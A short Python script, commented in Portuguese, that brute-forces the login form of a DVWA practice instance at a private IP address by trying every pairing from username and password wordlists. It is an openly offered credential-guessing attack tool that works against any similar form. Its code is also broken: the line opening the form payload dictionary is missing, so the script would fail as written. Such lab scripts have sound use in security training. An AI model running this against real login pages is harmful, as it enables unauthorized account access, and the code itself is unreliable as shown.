import requests

# Configurações
url = "http://192.168.15.91/dvwa/login.php"  
users_file = "users.txt"
pass_file = "pass.txt"
erro_msg = "Login failed" # Mensagem que o site retorna quando erra

# Função para realizar o ataque
def bruteforce():
    try:
        with open(users_file, "r") as u_list:
            usuarios = u_list.read().splitlines()
        
        with open(pass_file, "r") as p_list:
            senhas = p_list.read().splitlines()
    except FileNotFoundError:
        print("[-] Erro: Arquivos de wordlist não encontrados.")
        return

    print(f"[+] Iniciando ataque em: {url}")
    print(f"[+] Carregados {len(usuarios)} usuários e {len(senhas)} senhas.")

    for user in usuarios:
        for password in senhas:
            # Dados que o formulário espera
                'username': user,
                'password': password,
                'Login': 'Login'
            }
            
            # Envia a requisição POST
            response = requests.post(url, data=payload)
            
            # Verifica se logou (se a mensagem de erro NÃO estiver na página)
            if erro_msg not in response.text:
                print(f"\n[★] SUCESSO! Credenciais encontradas:")
                print(f"    Usuário: {user}")
                print(f"    Senha:   {password}")
                return # Para o script ao encontrar
            else:
                print(f"[-] Falha: {user}:{password}", end='\r')

    print("\n[!] Fim da lista. Nenhuma credencial encontrada.")

if __name__ == "__main__":
    bruteforce()
